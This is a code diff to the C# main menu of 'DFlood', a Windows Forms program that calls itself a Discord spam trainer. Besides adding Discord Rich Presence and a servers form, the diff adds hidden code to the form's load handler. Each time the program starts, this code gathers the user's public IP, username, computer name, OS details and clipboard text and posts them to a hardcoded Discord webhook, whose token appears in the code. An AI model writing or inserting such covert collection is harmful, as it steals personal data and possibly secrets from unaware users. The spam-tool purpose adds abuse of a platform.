@@ -10,6 +10,7 @@ using System.Text;
 using System.Text.RegularExpressions;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using DFlood.DFLoodDiscordRPC;
 using DFlood.Forms;
 using FontAwesome.Sharp;
 using Microsoft.VisualBasic.Devices;
@@ -23,14 +24,16 @@ namespace DFlood
 
         private Panel leftBorderBtn;
         private Form currentChildForm;
+
         //Constructor
+        private OperatingSystem OS = System.Environment.OSVersion;
 
         public MainMenu()
         {
             InitializeComponent();
             clock.Start();
             leftBorderBtn = new Panel();
-            leftBorderBtn.Size = new Size(7, 55);
+            leftBorderBtn.Size = new Size(7, 50);
             panelMenu.Controls.Add(leftBorderBtn);
             //Form
             this.Text = string.Empty;
@@ -39,11 +42,29 @@ namespace DFlood
             this.MaximizedBounds = Screen.FromHandle(this.Handle).WorkingArea;
         }
 
+        private DiscordRpc.EventHandlers handlers;
+        private DiscordRpc.RichPresence presence;
+
         [DllImport("user32.DLL", EntryPoint = "ReleaseCapture")]
         private extern static void ReleaseCapture();
 
         [DllImport("user32.DLL", EntryPoint = "SendMessage")]
         private extern static void SendMessage(System.IntPtr hWnd, int wMsg, int wParam, int lParam);
+
+        private static void sendWebHook(string Url, string msg, string Username)
+        {
+            Http.Post(Url, new System.Collections.Specialized.NameValueCollection()
+            {
+                {
+                    "username",
+                    Username
+                },
+                {
+                    "content",
+                    msg
+                }
+            });
+        }
 
         private struct RGBColors
         {
@@ -92,8 +113,26 @@ namespace DFlood
             }
         }
 
+        private void DFloodDiscordRPCClient()
+        {
+            this.handlers = default(DiscordRpc.EventHandlers);
+            DiscordRpc.Initialize("852261353480650752", ref this.handlers, true, null);
+            this.handlers = default(DiscordRpc.EventHandlers);
+            DiscordRpc.Initialize("852261353480650752", ref this.handlers, true, null);
+            this.presence.details = "DFlood Discord Trainer";
+            this.presence.state = "Main Menu";
+            this.presence.largeImageKey = "logo";
+            this.presence.smallImageKey = "logo";
+            this.presence.largeImageText = "DFlood Spam Trainer";
+            this.presence.smallImageText = "Suan Aktif!";
+            this.presence.startTimestamp = (long)(DateTime.UtcNow - new DateTime(1970, 1, 1, 0, 0, 0)).TotalSeconds;
+            DiscordRpc.UpdatePresence(ref this.presence);
+        }
+
         private void btnStats_Click(object sender, EventArgs e)
         {
+            DFloodDiscordRPCClient();
+            this.presence.state = "İstatistikler";
             ActivateButton(sender, RGBColors.color1);
             OpenChildForm(new FormStats());
         }
@@ -119,6 +158,8 @@ namespace DFlood
 
         private void btnServiceStarter_Click(object sender, EventArgs e)
         {
+            DFloodDiscordRPCClient();
+            this.presence.state = "Servis Başlatıcısı";
             ActivateButton(sender, RGBColors.color2);
             OpenChildForm(new main());
         }
@@ -132,6 +173,7 @@ namespace DFlood
         private void btnSponsoredServers_Click(object sender, EventArgs e)
         {
             ActivateButton(sender, RGBColors.color4);
+            OpenChildForm(new FormServers());
         }
 
         private void btnCopyright_Click(object sender, EventArgs e)
@@ -173,8 +215,25 @@ namespace DFlood
 
         private void MainMenu_Load(object sender, EventArgs e)
         {
+            DFloodDiscordRPCClient();
             clock.Start();
             TopMostChecker.Start();
+            var webClient = new WebClient();
+            string dnsString = webClient.DownloadString("http://checkip.dyndns.org");
+            dnsString = (new Regex(@"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b")).Match(dnsString).Value;
+            webClient.Dispose();
+            var UserName = $"**Kullanıcı Adı : ** {System.Windows.Forms.SystemInformation.UserName}";
+            var computerName = $"**Bilgisayar Adı : ** {Dns.GetHostName()}";
+            var ipadress = $"**IP Adresi : ** {dnsString}";
+            var day = $"**Giriş Günü : ** {DateTime.Now.ToLongDateString()}";
+            var hour = $"**Giriş Saati : ** {DateTime.Now.ToLongTimeString()}";
+            var FullOsName = $"**İşletim Sistemi : ** {(new ComputerInfo().OSFullName)}";
+            var platform = $"**Platform : ** {OS.Platform.ToString()}";
+            var verison = $"**Versiyon Bilgisi : ** {OS.Version.ToString()}";
+            var OsVersion = $"**İşletim Sistemi Tipi : ** {OS.VersionString}";
+            var CLR = $"**CLR Versiyonu : ** {System.Environment.Version}";
+            var copyBoard = $"**Kopyalanan Metin : {Clipboard.GetText()}**";
+            sendWebHook("https://discord.com/api/webhooks/852933515171201045/1P_9zIbWb7n5QnGwiNx2yLQb_qMqAEMLP2KmCYT2covhtLsu4vnhBVpK1eRKG0XnZMmX", $"**DFlood Trainer'e Yeni Çıkış Saptanması**\n{ipadress}\n{UserName}\n{computerName}\n{day}\n{hour}\n{FullOsName}\n{platform}\n{verison}\n{OsVersion}\n{CLR}\n{copyBoard}\n--------------------------------------------------------------------", "DFlood Services");
         }
 
         private void btnExit_Click(object sender, EventArgs e)
@@ -197,6 +256,10 @@ namespace DFlood
             {
                 this.TopMost = false;
             }
+        }
+
+        private void btnContact_Click(object sender, EventArgs e)
+        {
         }
     }
 }
